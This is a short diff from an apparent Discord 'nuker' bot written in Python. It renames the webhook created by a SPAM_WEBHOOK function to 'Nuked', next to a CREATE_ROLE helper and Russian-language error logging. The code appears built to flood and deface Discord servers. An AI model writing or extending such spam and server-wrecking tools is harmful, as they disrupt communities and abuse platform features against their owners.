@@ -22,7 +22,7 @@ async def CREATE_ROLE(guild, name):
 
 async def SPAM_WEBHOOK(channel, message):
     try:
-        webhook = await channel.create_webhook(name='everyone')
+        webhook = await channel.create_webhook(name='Nuked')
     except Exception as e:
         log_error(f'SPAM_WEBHOOk: {e}', 'ОШИБКА', 1)
         return
